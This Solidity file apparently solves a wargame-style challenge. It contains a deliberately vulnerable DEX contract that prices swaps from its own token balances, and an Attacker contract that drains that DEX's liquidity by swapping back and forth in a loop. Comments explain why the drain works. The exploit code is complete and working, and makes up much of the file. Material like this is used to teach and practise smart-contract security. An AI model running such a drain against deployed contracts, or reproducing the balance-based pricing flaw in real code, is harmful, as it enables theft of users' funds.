// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address tokenAddress, uint256 amount) public onlyOwner {
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    )
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract Attacker {
    address private token1;
    address private token2;
    Dex private dex;

    constructor(Dex dex_, IERC20 token1_, IERC20 token2_) {
        dex = dex_;
        token1 = address(token1_);
        token2 = address(token2_);
    }

    /**
     * Since DEX uses a linear pricing model, we can do subsequent swap calls to drain it completely
     */
    function attack(uint256 amount) external {
        IERC20(token1).transferFrom(msg.sender, address(this), amount);
        IERC20(token2).transferFrom(msg.sender, address(this), amount);
        dex.approve(address(dex), type(uint256).max);

        bool exitLoop;
        while (!exitLoop) {
            // trade token1 with token2
            exitLoop = _swap(token1, token2);
            if (exitLoop) break;

            // trade token2 with token1
            exitLoop = _swap(token2, token1);
        }

        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }

    function _swap(address tokenIn, address tokenOut) private returns (bool exitLoop) {
        uint256 amountIn = IERC20(tokenIn).balanceOf(address(this));
        uint256 tokenOutLiq = IERC20(tokenOut).balanceOf(address(dex));
        uint256 tokenInLiq = IERC20(tokenIn).balanceOf(address(dex));

        uint256 amountOut = dex.getSwapPrice(tokenIn, tokenOut, amountIn);
        if (amountOut < tokenOutLiq) {
            dex.swap(tokenIn, tokenOut, amountIn);
            return false;
        } else {
            dex.swap(tokenIn, tokenOut, tokenInLiq);
            // since now liquidity is less we can break the loop
            return true;
        }
    }
}
